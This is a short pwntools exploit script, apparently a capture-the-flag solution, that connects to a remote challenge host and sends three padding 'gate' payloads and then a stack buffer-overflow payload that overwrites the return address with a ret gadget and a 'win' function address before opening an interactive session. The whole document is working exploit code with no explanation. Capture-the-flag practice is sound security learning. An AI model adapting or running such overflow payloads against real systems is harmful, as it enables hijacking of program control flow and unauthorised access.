from pwn import *

p = remote("0.cloud.chals.io", 21543)

gate_1_payload = b"\x41"*269
gate_2_payload = b"\x41"*520 + b"\x29" + b"\x00"*3 + b"\x41"
gate_3_payload = b"\x41"*76 + b"\xc9\x07\xcc\x00"

offset = 6776

ret_gadget = p64(0x401499)
win_addr = p64(0x40123b)

win_payload = b"\x41"*offset + ret_gadget + win_addr

print(gate_1_payload)
print(gate_2_payload)
print(gate_3_payload)
print(win_payload)

p.sendline(gate_1_payload)
p.sendline(gate_2_payload)
p.sendline(gate_3_payload)
p.sendline(win_payload)

p.interactive()